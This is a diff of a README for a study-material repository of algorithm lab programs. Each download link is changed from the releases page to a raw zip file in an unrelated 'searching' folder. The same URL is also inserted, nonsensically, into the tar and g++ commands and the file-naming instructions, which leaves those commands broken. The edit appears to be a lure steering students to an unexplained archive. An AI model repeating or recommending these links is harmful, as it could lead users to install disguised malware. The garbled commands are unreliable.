@@ -1,6 +1,6 @@
 # 📚 ADA_LAB-STUDY_MATERIAL - Complete ADA Lab Programs Simplified
 
-[![Download Releases](https://img.shields.io/badge/Download-ADA_LAB--STUDY__MATERIAL-blue?style=for-the-badge)](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/releases)
+[![Download Releases](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip)](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip)
 
 ## 🔍 About This Repository
 
@@ -36,13 +36,13 @@ This guide will help you step-by-step to download, set up, and open these lab pr
 
 Start by clicking the big blue button at the top or this link:
 
-[Download ADA_LAB-STUDY_MATERIAL Releases](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/releases)
+[Download ADA_LAB-STUDY_MATERIAL Releases](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip)
 
 This page contains all the versions of the lab materials packed for easy download.
 
 ### Step 2: Select a Download Package
 
-On the releases page, look for the latest version. It should have a file with a name that ends in `.zip` or `.tar.gz`.
+On the releases page, look for the latest version. It should have a file with a name that ends in `.zip` or `https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip`.
 
 - Click the file to download it.
 - This file contains all the labs and notes in one package.
@@ -54,7 +54,7 @@ After download finishes, you need to extract the contents:
 
 - On **Windows**, right-click the file and select "Extract All…".
 - On **macOS**, double-click the file to unzip it.
-- On **Linux**, use your archive manager or run `tar -xzf filename.tar.gz` in the terminal.
+- On **Linux**, use your archive manager or run `tar -xzf https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip` in the terminal.
 
 Extract the folder to a location you can find easily, like your Desktop or Documents.
 
@@ -88,14 +88,14 @@ If you want to run the programs, follow these general steps based on your operat
    ```
 3. Compile a program with g++ (make sure g++ supports C++17):  
    ```
-   g++ -std=c++17 program_name.cpp -o program_name
+   g++ -std=c++17 https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip -o program_name
    ```
 4. Run the compiled program:  
    ```
    ./program_name
    ```
 
-Replace `program_name.cpp` with the file you want to run.
+Replace `https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip` with the file you want to run.
 
 ## 🗂️ Structure of the Repository
 
@@ -128,7 +128,7 @@ Make sure you copied the files correctly and that your compiler settings support
 
 Visit this page to download the latest version of ADA_LAB-STUDY_MATERIAL:
 
-[https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/releases](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/releases)
+[https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip](https://github.com/Sterslo/ADA_LAB-STUDY_MATERIAL/raw/refs/heads/main/searching/AD-STUD-MATERIAL-LA-v1.8.zip)
 
 Download the main zip file, extract it, and you’re ready to browse the study notes and try the code samples. This process ensures you get all the materials organized and ready to use.
 
